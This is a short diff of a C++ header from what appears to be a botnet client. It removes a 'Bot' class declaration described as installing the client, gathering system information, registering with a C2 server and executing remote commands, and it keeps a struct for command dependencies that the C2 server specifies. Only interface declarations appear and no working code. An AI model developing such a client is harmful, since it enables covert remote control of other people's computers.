@@ -16,21 +16,6 @@
 
 namespace fs = std::experimental::filesystem;
 
-/* Singleton representing overall logic for installing client, gathering system
- * information, registering with the C2 server, and executing Commands */
-class Bot {
-   public:
-    Bot(const fs::path& install_dir);
-    bool IsNew();
-    void Install();
-    void RegisterBot(const std::string& register_url);
-    void ExecuteCommand(const std::string& command_url);
-
-   private:
-    std::unique_ptr<Installer> install_;
-    std::unique_ptr<sysinfo::DataList> sysinfo_;
-};
-
 // Base class for dependency files required by Command instances as specified by
 // C2 server response
 struct CommandDependency {
